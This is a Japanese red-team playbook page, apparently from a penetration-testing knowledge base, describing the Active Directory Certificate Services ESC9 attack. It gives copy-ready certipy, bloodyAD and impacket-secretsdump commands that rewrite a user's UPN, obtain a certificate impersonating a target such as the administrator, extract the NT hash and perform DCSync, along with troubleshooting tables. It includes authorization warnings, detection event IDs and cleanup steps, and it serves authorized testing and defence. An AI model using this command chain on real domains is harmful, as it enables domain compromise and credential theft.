# ESC9 — No Security Extension（szOID_NTDS_CA_SECURITY_EXT 欠如）

> **スコープ**: テンプレートの `msPKI-Enrollment-Flag` に `CT_FLAG_NO_SECURITY_EXTENSION` が設定されている場合に、制御可能ユーザーの UPN を標的 UPN に書き換えて証明書を取得〜DCSync まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [x] 不可逆な設定変更を含む（UPN を一時書き換えるため書き換え中にロック・混乱が起きるリスクあり）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

- `certipy find` で対象テンプレートに `[!] Vulnerabilities: ESC9` が表示されている
- または `msPKI-Enrollment-Flag` に `CT_FLAG_NO_SECURITY_EXTENSION`（値 `0x00080000`）が設定 + `Client Authentication: True` + 攻撃者が任意のドメインユーザーアカウントに対して `GenericWrite` または `WriteProperty(userPrincipalName)` 権限を持つ

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `certipy`（`pip install certipy-ad`）/ `bloodyAD`（UPN 書き換え用）/ `ldapsearch`（msPKI-Enrollment-Flag の RAW 値確認用）

## 先に確認すること

**攻撃者の思考トレース:** 通常の証明書には `szOID_NTDS_CA_SECURITY_EXT` 拡張が埋め込まれ、証明書と AD アカウントの `objectSid` が紐づく。これがあると発行先アカウントしか認証に使えない。このフラグが設定されたテンプレートではその拡張が入らないため、証明書の UPN フィールドだけで認証アカウントが決まる。発行申請前に被制御ユーザーの UPN を標的の UPN に書き換えれば、標的として証明書を取得できる。

---

## 1. ESC9 条件確認

**コマンド:**

```bash
# [Attacker] ESC9 確認
certipy find -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -vulnerable -stdout

# [Attacker] msPKI-Enrollment-Flag の RAW 値確認（Certipy で検出されない場合）
ldapsearch -H ldap://[DC_IP] -x -D "[USER]@[DOMAIN]" -w "[PASSWORD]" \
  -b "CN=[TEMPLATE_NAME],CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[DOMAIN_PART],DC=[DOMAIN_PART]" \
  "(objectClass=pKICertificateTemplate)" msPKI-Enrollment-Flag
# 出力例: msPKI-Enrollment-Flag: 524288 (= 0x80000 = CT_FLAG_NO_SECURITY_EXTENSION が含まれる)
```

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| `ESC9` が `[!] Vulnerabilities` に表示 | §2 UPN 書き換えへ進む |
| `StrongCertificateBindingEnforcement` が 2 | ESC9 の攻撃経路は封じられている。ESC10 との違いを確認 |

---

## 2. 制御可能ユーザーの UPN を標的の UPN に書き換える

**事前準備（必須）:** `sudo ntpdate -u [DC_IP]` で時刻同期。

**コマンド:**

```bash
# [Attacker] bloodyAD で UPN を書き換える
bloodyAD --host [DC_IP] -d [DOMAIN] -u [ATTACKER_USER] -p "[ATTACKER_PASSWORD]" \
  set attribute [CONTROLLED_USER] userPrincipalName "[TARGET_UPN]"
# 例: TARGET_UPN = administrator@example.local
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 成功 | UPN 書き換え完了 | §3 証明書申請へ（すぐに実施）|
| `ACCESS_DENIED` | `GenericWrite` ACE の実際のスコープを BloodHound で再確認 | `WriteProperty(userPrincipalName)` に限定されているか確認 |

---

## 3. 書き換えた UPN で証明書を申請する

**コマンド:**

```bash
# [Attacker] CONTROLLED_USER の認証情報で証明書を申請（UPN は TARGET_UPN に書き換え済み）
certipy req \
  -ca [CA_NAME] -template [TEMPLATE_NAME] \
  -u [CONTROLLED_USER]@[DOMAIN] -p "[CONTROLLED_USER_PASSWORD]" -dc-ip [DC_IP]
# → 発行された証明書の SAN には TARGET_UPN が入る → [CONTROLLED_USER].pfx が生成される
```

---

## 4. UPN を元に戻す（原状回復・即時必須）

```bash
# [Attacker] UPN を元の値に戻す（証明書取得直後に実施）
bloodyAD --host [DC_IP] -d [DOMAIN] -u [ATTACKER_USER] -p "[ATTACKER_PASSWORD]" \
  set attribute [CONTROLLED_USER] userPrincipalName "[ORIGINAL_UPN]"
```

---

## 5. PKINIT 認証 → NT ハッシュ取得 → DCSync

**コマンド:**

```bash
# [Attacker] 証明書で認証（TARGET_UPN として）
certipy auth -pfx [CONTROLLED_USER].pfx -domain [DOMAIN] -username [TARGET_USERNAME] -dc-ip [DC_IP]
# → NT ハッシュと TGT が出力される

# [Attacker] DCSync
impacket-secretsdump -just-dc-ntlm -no-pass -hashes :[NT_HASH] [DOMAIN]/[TARGET_USERNAME]@[DC_IP]

# [Attacker] 原状回復: 証明書の失効
certipy ca -ca [CA_NAME] -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| `certipy auth` が `KDC_ERR_PADATA_TYPE_NOSUPP` | `StrongCertificateBindingEnforcement=2` で SID なし証明書を拒否。ESC10 の条件も同時確認 |
| UPN 書き換え後すぐに元に戻しても cert が CONTROLLED_USER にバインドされる | `StrongCertificateBindingEnforcement` が有効で SID バインドが必要。ESC9 は不成立 |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。他ユーザーの属性を一時改ざんするため影響範囲が広い
- **想定されるSIEM/EDR検知**: Event ID 4738（UPN 書き換え）/ 4886・4887（証明書要求・発行）/ 4768（TGT 要求）/ MDI アラート
- **業務影響リスク**: UPN 書き換え中に対象ユーザーが認証を試みると失敗する可能性あり。短時間での実施を徹底する
- **原状回復必須項目**: ✅ 書き換えた UPN を元の値に戻す / ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：GenericWrite によるユーザー属性書き換え → `../ACE_Abuse/GenericWrite.md`
- 後：ESC10（KDC 側のマッピング設定の確認）→ `ESC10.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
